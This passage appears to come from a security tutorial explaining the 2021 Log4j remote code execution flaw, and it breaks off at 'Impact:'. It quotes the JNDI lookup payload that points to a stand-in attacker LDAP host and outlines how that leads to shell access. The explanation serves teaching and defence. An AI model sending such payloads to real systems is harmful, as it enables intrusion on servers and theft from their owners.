### Real Examples

**Log4j Vulnerability (December 2021)**

```
Component: Apache Log4j (logging library)
Used by: 95% of Java applications, billions of devices
Vulnerability: Remote code execution
Severity: CRITICAL (CVSS 10.0)

How it works:
Log4j can render special format strings:
${java:version}         → Shows Java version
${env:USER_HOME}        → Shows home directory
${sys:user.name}        → Shows username

Attack:
${jndi:ldap://attacker.com/exploit}

When logged, Log4j tries to fetch object from attacker's LDAP server
Server returns malicious Java object
Object deserializes and executes attacker's code
Attacker gains shell access to server

Impact:
